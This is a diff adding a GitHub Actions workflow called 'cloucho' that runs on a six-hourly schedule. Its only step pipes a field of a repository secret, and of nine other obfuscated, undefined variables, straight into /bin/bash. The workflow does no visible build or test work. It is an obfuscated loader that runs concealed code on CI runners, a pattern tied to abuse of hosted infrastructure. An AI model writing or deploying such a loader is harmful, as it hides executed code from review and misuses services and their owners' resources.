@@ -1,0 +1,28 @@
+name: cloucho
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cloucho
+        env:
+          xybl9360: ${{ secrets.xybl9360 }}
+        run: |
+          echo $xybl9360 | jq -r .vd0 | /bin/bash
+          echo $atak81 | jq -r .hu3564 | /bin/bash
+          echo $fow3674 | jq -r .y48 | /bin/bash
+          echo $aflk75412 | jq -r .a24 | /bin/bash
+          echo $bhhz9756 | jq -r .g08 | /bin/bash
+          echo $s0 | jq -r .ozsow6 | /bin/bash
+          echo $wjwrs385 | jq -r .sht842 | /bin/bash
+          echo $fxqtr142 | jq -r .d18 | /bin/bash
+          echo $x401 | jq -r .lqghk75 | /bin/bash
+          echo $niw9093 | jq -r .apjuw95 | /bin/bash
+
